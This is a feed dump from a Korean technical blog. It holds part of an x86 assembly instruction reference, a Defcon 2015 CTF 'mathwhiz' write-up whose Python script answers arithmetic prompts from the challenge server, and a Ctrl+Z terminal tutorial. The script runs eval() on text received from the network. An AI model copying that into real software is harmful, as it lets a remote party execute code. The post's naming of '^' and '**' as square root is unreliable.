&lt;p&gt;&lt;strong&gt;SUB&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드1에 오퍼랜드2의 값을 뺀다.&lt;/p&gt;
&lt;p&gt;  SUB reg, reg
SUB mem, reg
SUB reg, mem
SUB reg, imm
SUB mem, imm&lt;/p&gt;
&lt;p&gt;  ex) SUB [ebp - 4], 0xf —&gt; (ebp - 4)가 가르키는 메모리에 대한 값을 0xf를 뺀다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;데이터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%8D%B0%EC%9D%B4%ED%84%B0&quot; aria-label=&quot;데이터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;데이터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MOV&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드2의 내용을 오퍼랜드1에 복사한다.&lt;/p&gt;
&lt;p&gt;  MOV reg, reg
MOV mem, reg
MOV reg, mem
MOV reg16, segreg
MOV segreg, reg16
MOV reg, imm&lt;/p&gt;
&lt;p&gt;  ex) MOV eax, 0x10 —&gt; eax레지스터에 0x10(16)을 저장한다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;LEA&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드2의 주소를 오퍼랜드1에 넣는다.&lt;/p&gt;
&lt;p&gt;  LEA reg, mem&lt;/p&gt;
&lt;p&gt;  ex) LEA eax, [ebp-0x13] —&gt; eax에 (ebp-0x13)의 주소를 넣음&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PUSH&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드의 값을 스택메모리 최상단에 저장한다.&lt;/p&gt;
&lt;p&gt;  PUSH reg16/32
PUSH mem16/32
PUSH segreg
PUSH imm16/imm32&lt;/p&gt;
&lt;p&gt;  ex) PUSH eax —&gt; eax의 값을 스택메모리 최상단에 저장한다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;POP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;스택메모리 최상단에 있는 값을 오퍼랜드에 저장한다.&lt;/p&gt;
&lt;p&gt;  POP reg16/reg32
POP mem16/mem32
POP segreg&lt;/p&gt;
&lt;p&gt;  ex) POP eax —&gt; 스택메모리 최상단에 저장된 값을 eax에 저장한다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PTR&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;사용할 메모리에 대한 주소와 크기를 지정해 준다.&lt;/p&gt;
&lt;p&gt;  크기 PTR 주소&lt;/p&gt;
&lt;p&gt;  ex) DWORD PTR [esp+0x1c] —&gt; (esp+0x1c)를 시작으로 DWORD(4Byte)크기만큼을 사용한다고 선언.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TEST&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;함수리턴 및 성공여부 분별에 사용. 묵시적 AND연산을 수행한다.&lt;/p&gt;
&lt;p&gt;  TEST reg, reg
TEST mem, reg
TEST reg, mem
TEST reg, imm
TEST mem, imm&lt;/p&gt;
&lt;p&gt;  ex) TEST eax, ebx -&gt; eax와 ebx를 AND연산을 하고, 플래그에 값을 주지만 eax와 ebx에는 영향을 주지 않는다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CMP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;묵시적 비교를 수행&lt;/p&gt;
&lt;p&gt;  CMP reg, reg
CMP mem, reg
CMP reg, mem
CMP reg, imm
CMP mem, imm&lt;/p&gt;
&lt;p&gt;  ex) CMP DWORD PTR [esp+0x14],0x9 —&gt; (esp+0x14)에 있는 값과 0x9를 비교하여 플래그에 값을 줍니다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;JMP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;무조건 분기, C언어의 goto함수와 같은 기능&lt;/p&gt;
&lt;p&gt;  JMP label
JMP reg16
JMP mem16/mem32&lt;/p&gt;
&lt;p&gt;  ex) JLE 0x8048419 &amp;#x3C;main+85&gt; —&gt; 메인함수의 85번째코드로 이동&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;그외 J로 시작할경우 비교후 점프하는 구문일 가능성이 높음.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CALL&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;함수 호출에 사용, 함수 종료 이후에 되돌아올 주소 값을 저장, 리턴값을 STACK에 저장
CALL 0x80482f4 printf@plt —&gt; printf함수를 호출하였다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;RET&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;함수 종료에 사용 (return과 같은 기능)
RET imm8&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NOP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;아무 동작도 수행하지 않는 코드, 메모리공간이 비게될경우 NOP으로 채워넣는다.&lt;/p&gt;
&lt;p&gt;  NOP&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Defcon Qualifier CTF 2015 - mathwhiz[1] (babys-first)]]></title><description><![CDATA[…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 31 May 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;이 문제는 단순하게 계산을 하는 문제이다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me:21249&lt;/code&gt; 이곳으로 접속을 하게 되면, 간단한 수학 문제를 주게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;2 + 1 =&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 간단한 문제를 주게 된다. 이러한 문제를 계속 풀어 나가면 되는 문제이다. 하지만 단순하게 그냥 풀기만 하면 안된다. 문제를 푸는데 제한시간이 걸려있다. 약 2~3초쯤 지나면 자동으로 틀리게 되어있었다. 단순 노동으로 하지 말라는 뜻인거 같다.&lt;/p&gt;
&lt;p&gt;그래서 파이썬을 이용하여 스크립트를 짜기로 하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; socket &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
 
HOST &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me&apos;&lt;/span&gt;
PORT &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;21249&lt;/span&gt;
 
sock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; socket&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;AF_INET&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SOCK_STREAM&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;connect&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;HOST&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PORT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
count &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  count &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;recv&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; count
  &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; data
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;not&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;
  equation &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;equation&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;send&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
 
sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;close&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 식으로 코드를 작성했다. 다음과 같은 순서로 코드를 작성하였다.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;서버와 연결을 한다.&lt;/li&gt;
&lt;li&gt;서버로부터 식을 받는다.&lt;/li&gt;
&lt;li&gt;값이 있는지 판단한다.&lt;/li&gt;
&lt;li&gt;식에서 ’=‘을 제거하여 추출한다.&lt;/li&gt;
&lt;li&gt;식을 실행하여 결과를 가져온다.&lt;/li&gt;
&lt;li&gt;값을 문자열로 바꾼다.&lt;/li&gt;
&lt;li&gt;값을 서버로 전송한다.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;이렇게 작성하였는데, 10~20번째 주고받기를 하면 문제가 약간 변형된다. 중간에 &lt;strong&gt;소괄호&lt;/strong&gt;”()“가 추가되어 출력이 된다. &lt;/p&gt;
&lt;p&gt;하지만 스크립트에서 소괄호를 처리할 수 있기 때문에 상관이 없다. 그렇지만 나중에 중괄호도 추가가 되었다. &lt;strong&gt;중괄호&lt;/strong&gt;는 처리를 못하기 때문에 직접 수정을 해 주어야 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;data = data.replace(&apos;[&apos;, &apos;(&apos;)
data = data.replace(&apos;]&apos;, &apos;)&apos;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그래서 다음의 코드를 추가하여 치환해 주었다.&lt;/p&gt;
&lt;p&gt;그렇게 다시 실행하다 보니, 중괄호 뿐만 아니라 &lt;strong&gt;대괄호&lt;/strong&gt;도 추가가 되었다. 그래서 대괄호도 중괄호와 같은 방식으로 처리해 주었다.
다시 실행하니 이번에는 ONE, TWO, THREE로 나오는 부분이 있다. 이 부분을 &lt;code class=&quot;language-text&quot;&gt;ONE&lt;/code&gt;를 1로, &lt;code class=&quot;language-text&quot;&gt;TWO&lt;/code&gt;를 2로, &lt;code class=&quot;language-text&quot;&gt;THREE&lt;/code&gt;를 3으로 치환해 주었다. 마지막으로 ^가 나왔는데, 이 기호는 수학적으로 제곱근을 의미하지만, 파이썬에서는 &lt;strong&gt;비트연산&lt;/strong&gt;을 의미한다. 그래서 이 부분을 &lt;strong&gt;제곱근 연산&lt;/strong&gt; ”**” 으로 수정해 주었다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; socket &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
 
HOST &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;mathwhiz_c951d46fed68687ad93a84e702800b7a.quals.shallweplayaga.me&apos;&lt;/span&gt;
PORT &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;21249&lt;/span&gt;
 
sock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; socket&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;AF_INET&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SOCK_STREAM&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;connect&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;HOST&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PORT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
count &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  count &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; count &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;recv&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; count
  &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt; data
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;not&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;[&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;]&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;ONE&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;TWO&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;2&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;THREE&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;3&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;{&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;replace&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;^&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;**&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  equation &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;equation&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;send&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
 
sock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;close&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;최종적으로 이러한 코드가 만들어 지게 되었다. 이 코드를 실행하면 flag를 획득할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;998
2 + 1 - 1 =

999
2 + 2 - 1 - 1 =

1000
3 - 3 + 2 =

1001
You won!!!
The flag is: Farva says you are a FickenChucker and you&apos;d better watch Super Troopers 2
F?&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[터미널 제어 문자 (^Z)]]></title><description><![CDATA[Ctrl + Z키를 누르게 될 경우에는 해당 프로세스를 일시 정지 하게 됩니다. 직접 확인을 해보겠습니다. 단순히 1 ~ 100까지 1초단위로 출력을 하게되는 프로그램 입니다. 이 프로그램을 실행시키는 도중 Ctrl+Z…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 25 May 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Ctrl + Z키를 누르게 될 경우에는 해당 프로세스를 일시 정지 하게 됩니다.&lt;/p&gt;
&lt;p&gt;직접 확인을 해보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# cat process.sh&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token for-or-select variable&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$i&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;단순히 1 ~ 100까지 1초단위로 출력을 하게되는 프로그램 입니다. 이 프로그램을 실행시키는 도중 Ctrl+Z를 이용하여 중단시켜 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;root@ubuntu:~# ./process.sh
1
2
3
^Z
[1]+  Stopped                 ./process.sh
root@ubuntu:~#&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 프로세스를 Stopped 상태로 변경시키게 되었습니다.
이 상태에서 &lt;code class=&quot;language-text&quot;&gt;fg&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;bg&lt;/code&gt;명령을 이용하여 해당 프로세스를 어떠한 형태로 실행시킬지 선택하게 됩니다.&lt;/p&gt;
&lt;p&gt;fg(&lt;strong&gt;F&lt;/strong&gt;ore&lt;strong&gt;G&lt;/strong&gt;round)를 사용하게 되면 프로세스를 다시 제어하는 상태로 변경하게 됩니다. 제어하는 상태는 이 상태에서 명령을 입력할 수 있는 상태를 말합니다.&lt;/p&gt;
&lt;p&gt;그럼 &lt;code class=&quot;language-text&quot;&gt;fg&lt;/code&gt;를 사용해 보겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ./process.sh&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;
^Z
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;+  Stopped                 ./process.sh
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# fg&lt;/span&gt;
./process.sh
&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;
^Z
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;+  Stopped                 ./process.sh
root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
